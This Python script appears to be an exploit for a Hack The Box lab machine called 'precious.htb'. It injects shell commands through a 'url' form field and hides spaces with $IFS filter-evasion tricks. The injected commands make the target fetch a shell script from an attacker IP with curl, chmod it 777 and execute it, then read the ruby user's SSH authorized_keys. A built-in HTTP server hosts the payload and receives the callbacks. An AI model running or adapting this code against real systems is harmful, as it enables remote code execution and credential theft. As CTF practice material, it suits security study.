import requests
from http.server import SimpleHTTPRequestHandler, BaseHTTPRequestHandler, HTTPServer
import multiprocessing as mp
import urllib.parse

RHOST = 'http://precious.htb'
LHOST = 'http://10.10.16.14:9001'
LPORT = 9001
PAYLOAD = 'shellssh.sh'

def execute_exploit():
    # Upload shell
    data={
        'url': LHOST + '/a' + '$(X=curl;Y=10.10.16.14:9001/' + PAYLOAD + ';Z=$X$IFS$Y$IFS-o$IFS$PWD/pdf/' + PAYLOAD + ';$Z)'
    }
    r = requests.post(RHOST, data=data)

    # Make shell executable
    data={
        'url': LHOST + '/a' + '$(X=chmod;Y=777;Z=$X$IFS$Y$IFS$PWD/pdf/' + PAYLOAD + ';$Z)'
    }
    r = requests.post(RHOST, data=data)

    # Execute shell
    data={
        'url': LHOST + '/a' + '$($PWD/pdf/' + PAYLOAD + ')'
    }
    r = requests.post(RHOST, data=data)

    # List shell (sanity check)
    data={
        'url': LHOST + '/a' + '$(X=ls;Y=-al;Z=$X$IFS$Y$IFS$PWD/pdf;$Z)'
    }
    r = requests.post(RHOST, data=data)

    # List ssh
    data={
        'url': LHOST + '/a' + '$(X=cat;Z=$X$IFS/home/ruby/.ssh/authorized_keys;$Z)'
    }
    r = requests.post(RHOST, data=data)

    # List ssh
    data={
        'url': LHOST + '/a' + '$(X=ls;Y=-al;Z=$X$IFS$Y$IFS/home/ruby/.ssh;$Z)'
    }
    r = requests.post(RHOST, data=data)

class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        print('[+][{}] Request received'.format(self.server.server_port))
        print(urllib.parse.unquote(self.path))

        if self.path == '/' + PAYLOAD:
            self.send_response(200)
            self.send_header('Content-type','text/html')
            self.end_headers()
            with open('./' + PAYLOAD, 'rb') as file:
                self.wfile.write(file.read())

    def log_message(self, format, *args):
        return

def callback_server(port):
    http = HTTPServer(('', port), Handler)
    http.serve_forever()

if __name__ == '__main__':
    server = mp.Process(target=callback_server, args=(LPORT,))
    server.start()

    execute_exploit()

    server.terminate()
